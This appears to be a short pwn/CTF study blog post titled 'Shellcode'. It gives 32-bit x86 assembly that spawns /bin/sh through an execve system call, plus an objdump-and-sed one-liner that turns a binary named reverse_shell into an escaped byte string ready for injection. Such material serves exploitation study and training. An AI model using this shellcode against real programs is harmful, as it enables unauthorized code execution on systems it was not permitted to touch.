---
layout: post
title:  Shellcode
date: 2023-12-10 20:00:03 +0900
categories: PWN
---
## Shellcode
```
xor ecx, ecx       ; ecx = NULL
mov edx, ecx       ; edx = NULL
push ecx           ; push NULL
push 0x68732f6e    ; push n/sh in reverse
push 0x69622f2f    ; push //bi in reverse
mov ebx, esp       ; ebx now points to //bin/sh
mov al, 0xb        ; systemcall execve
int 0x80
```
```
objdump -d ./reverse_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```